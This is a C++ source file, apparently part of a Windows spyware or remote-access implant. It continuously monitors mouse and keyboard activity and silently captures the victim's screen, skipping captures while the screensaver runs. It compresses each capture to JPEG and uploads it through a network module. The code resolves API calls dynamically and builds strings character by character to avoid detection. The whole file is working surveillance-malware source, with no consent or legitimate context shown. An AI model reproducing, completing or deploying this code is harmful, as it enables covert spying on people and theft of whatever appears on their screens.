#include <Windows.h>
#include "../api.h"
#include "../public.h"
#include "ScreenSnapshot.h"
#include "../network/NetWorkdata.h"
#include "GetScreenFrame.h"
#include "../log.h"

#pragma comment(lib, "GdiPlus.lib")


using namespace Gdiplus;
using namespace std;
class GdiPlusIniter
{
public:
	GdiPlusIniter()
	{
		GdiplusStartupInput StartupInput;
		lpGdiplusStartup(&m_gdiplusToken, &StartupInput, NULL);
	}

	~GdiPlusIniter()
	{
		lpGdiplusShutdown(m_gdiplusToken);
	}
private:
	ULONG_PTR m_gdiplusToken;
};
//need to initialize the Gdiplus object,else the function in screenshot will be in error










int __stdcall GetScreenSnapshot(LPSCREENSNAPSHOT_TIME lpstTime)
{
	SCREENSNAPSHOT_TIME stWaitTime = *lpstTime;
	stWaitTime.iMinTime = stWaitTime.iMinTime * 1000;
	stWaitTime.iMaxTime = stWaitTime.iMaxTime * 1000;

	GdiPlusIniter GdiPlusIniterGlobal;

	POINT stCurPoint = { 0 };
	POINT stLastPoint = { 0 };

	BYTE szLastKeyboardState[VIRTUAL_KEY_SIZE] = { 0 };
	BYTE szCurKeyboardState[VIRTUAL_KEY_SIZE] = { 0 };

	int iFlagMouseKey = TRUE;
	int iTimesCnt = stWaitTime.iMinTime;
	int iTimeWorkValue = stWaitTime.iMinTime;

	char szScreenDCName[] = { 'D','I','S','P','L','A','Y',0 };

	char szusJpgFormat[] = { 'i',0,'m',0,'a',0,'g',0,'e',0,'/',0,'j',0,'p',0,'e',0,'g',0,0,0 };
	//char szusJpgFormat[]	= {'i',0,'m',0,'a',0,'g',0,'e',0,'/',0,'b',0,'m',0,'p',0,0,0};

	try
	{
		while (TRUE)
		{
			lpSleep(SREENSNAPSHOT_WAIT_TIME_INTERVAL);

			int iRet = lpGetCursorPos(&stCurPoint);
			if (lpRtlCompareMemory((char*)&stLastPoint, (char*)&stCurPoint, sizeof(POINT)) != sizeof(POINT))
			{
				lpRtlMoveMemory((char*)&stLastPoint, (char*)&stCurPoint, sizeof(POINT));
				iFlagMouseKey++;
			}
			else
			{
				iRet = lpGetKeyboardState(szCurKeyboardState);
				if (lpRtlCompareMemory((char*)szLastKeyboardState, (char*)szCurKeyboardState, VIRTUAL_KEY_SIZE) != VIRTUAL_KEY_SIZE)
				{
					lpRtlMoveMemory((char*)&szLastKeyboardState, (char*)&szCurKeyboardState, VIRTUAL_KEY_SIZE);
					iFlagMouseKey++;
				}
			}

			iTimesCnt += SREENSNAPSHOT_WAIT_TIME_INTERVAL;

			if (iFlagMouseKey && (iTimesCnt < iTimeWorkValue) && (iTimeWorkValue == stWaitTime.iMinTime))
			{
				continue;
			}
			else if ((iFlagMouseKey == 0) && (iTimesCnt < iTimeWorkValue) && (iTimeWorkValue == stWaitTime.iMinTime))
			{
				continue;
			}
			else if (iFlagMouseKey && (iTimesCnt < iTimeWorkValue) && (iTimeWorkValue == stWaitTime.iMaxTime))
			{
				iTimesCnt = 0;
				iFlagMouseKey = 0;
				iTimeWorkValue = stWaitTime.iMinTime;
			}
			else if ((iFlagMouseKey == 0) && (iTimesCnt < iTimeWorkValue) && (iTimeWorkValue == stWaitTime.iMaxTime))
			{
				continue;
			}
			else if (iFlagMouseKey && (iTimesCnt >= iTimeWorkValue) && (iTimeWorkValue == stWaitTime.iMinTime))
			{
				iFlagMouseKey = 0;
				iTimesCnt = 0;
				iTimeWorkValue = stWaitTime.iMinTime;
			}
			else if (iFlagMouseKey && (iTimesCnt >= iTimeWorkValue) && (iTimeWorkValue == stWaitTime.iMaxTime))
			{
				iTimesCnt = 0;
				iFlagMouseKey = 0;
				iTimeWorkValue = stWaitTime.iMinTime;
			}
			else if ((iFlagMouseKey == 0) && (iTimesCnt >= iTimeWorkValue) && (iTimeWorkValue == stWaitTime.iMinTime))
			{
				iTimesCnt = 0;
				iFlagMouseKey = 0;
				iTimeWorkValue = stWaitTime.iMaxTime;
			}
			else if ((iFlagMouseKey == 0) && (iTimesCnt >= iTimeWorkValue) && (iTimeWorkValue == stWaitTime.iMaxTime))
			{
				iTimesCnt = 0;
				iFlagMouseKey = 0;
				iTimeWorkValue = stWaitTime.iMaxTime;
			}
			else
			{
				continue;
			}

			//check if is in screen save state
			int  iParam = 1;
			lpSystemParametersInfoA(SPI_GETSCREENSAVERRUNNING, 0, (PVOID)&iParam, 0);
			if (iParam)
			{
				//writeLog("screen is sleeping\r\n");
				continue;
			}

			int dwbmbitssize = 0;
			char* pixelData = 0;
			char* lpBuf = lpGlobalAlloc(GPTR, BMP_STREAM_SIZE);
			int dwBufSize = GetScreenFrame(BITSPERPIXEL, szScreenDCName, 0, 0, ScrnResolutionX, ScrnResolutionY, lpBuf, &pixelData, &dwbmbitssize);
			if (dwBufSize == FALSE)
			{
				continue;
			}

			IStream* istrBmp = NULL;
			IStream* istrJpg = NULL;
			iRet = _lpCreateStreamOnHGlobal(lpBuf, FALSE, &istrBmp);
			Bitmap stBmp(istrBmp);

			EncoderParameters encoderParameters;
			CLSID jpgClsid;

			if (GetEncoderClsid((const WCHAR*)szusJpgFormat, &jpgClsid) == -1)
			{
				writeLog("GetScreenSnapshot GetEncoderClsid error\r\n");
				continue;
			}
			encoderParameters.Count = 1;
			encoderParameters.Parameter[0].Guid = EncoderQuality;
			encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
			encoderParameters.Parameter[0].NumberOfValues = 1;

			ULONG quality = JPG_TRANSFORM_QUALITY;
			encoderParameters.Parameter[0].Value = &quality;

			unsigned char* lpJpg = (unsigned char*)lpGlobalAlloc(GPTR, JPG_STREAM_SIZE);
			iRet = _lpCreateStreamOnHGlobal(lpJpg, FALSE, &istrJpg);

			Status status = stBmp.Save(istrJpg, &jpgClsid, &encoderParameters);
			if (status == 0)
			{
				if (*(unsigned char*)lpJpg == 0xff && *(unsigned char*)(lpJpg + 1) == 0xd8 &&
					*(unsigned char*)(lpJpg + 2) == 0xff && *(unsigned char*)(lpJpg + 3) == 0xe0)
				{
					char* cTmp = _lpHexStrStr((char*)lpJpg, JPG_STREAM_SIZE, "\xff\xd9", 2);
					if (cTmp)
					{
						int jpegsize = cTmp + 2 - (char*)lpJpg;
						iRet = uploadData((char*)lpJpg, jpegsize, SCREENSNAPSHOT, 0);
					}
				}
			}

			istrJpg->Release();
			istrBmp->Release();
			lpGlobalFree(lpBuf);
			lpGlobalFree((char*)lpJpg);
			continue;
		}
	}
	catch (...)
	{
		writeLog("ScreenSnapShot exception\r\n");
		return FALSE;
	}
}


int  GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
	try
	{
		UINT num = 0;                    // number of image encoders     
		UINT size = 0;                  // size of the image encoder array in bytes     
		ImageCodecInfo* pImageCodecInfo = NULL;
		GetImageEncodersSize(&num, &size);
		if (size == 0)
		{
			writeLog("GetEncoderClsid lpGetImageEncodersSize error\r\n");
			return -1;     //   Failure     
		}

		pImageCodecInfo = (ImageCodecInfo*)(lpGlobalAlloc(GPTR, size));
		if (pImageCodecInfo == NULL)
		{
			writeLog("GetEncoderClsid lpGlobalAlloc error\r\n");
			return -1;     //   Failure    
		}

		lpGetImageEncoders(num, size, pImageCodecInfo);
		for (UINT j = 0; j < num; ++j)
		{
			if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
			{
				*pClsid = pImageCodecInfo[j].Clsid;
				lpGlobalFree((char*)pImageCodecInfo);
				return j;
			}
		}
		lpGlobalFree((char*)pImageCodecInfo);

		writeLog("GetEncoderClsid lpGetImageEncoders error\r\n");
		return -1;
	}
	catch (...)
	{
		writeLog("GetEncoderClsid exception\r\n");
		return FALSE;
	}
}